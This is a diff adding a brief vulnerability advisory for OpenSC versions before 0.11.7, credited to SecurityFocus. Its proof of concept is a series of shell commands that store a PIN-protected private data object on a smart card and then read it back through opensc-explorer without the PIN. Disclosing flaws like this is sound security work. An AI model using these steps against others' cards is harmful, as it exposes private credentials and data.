@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/33922/info
+
+OpenSC is prone to an unauthorized-access vulnerability.
+
+Attackers can exploit this issue to gain unauthorized access to private data, which may lead to other attacks.
+
+Versions prior to OpenSC 0.11.7 are vulnerable. 
+
+The following proof of concept is available:
+
+create a file with a secret:
+echo "This is my secret data" > secret-file
+
+To initialise a blank card:
+pkcs15-init --create-pkcs15 --use-default-transport-keys --profile pkcs15+onepin --pin 123456 --puk 78907890
+
+To write a private data object to the card:
+pkcs11-tool --label "my secret" --type data --write-object secret-file
+--private --login --pin 12345
+
+To see all objects on the card:
+pkcs15-tool --dump
+This will list the data object, including the path it is stored, e.g.:
+"Path: 3f0050154701"
+
+To access such an object with low-level tools:
+
+opensc-explorer
+cd 5015
+get 4701 
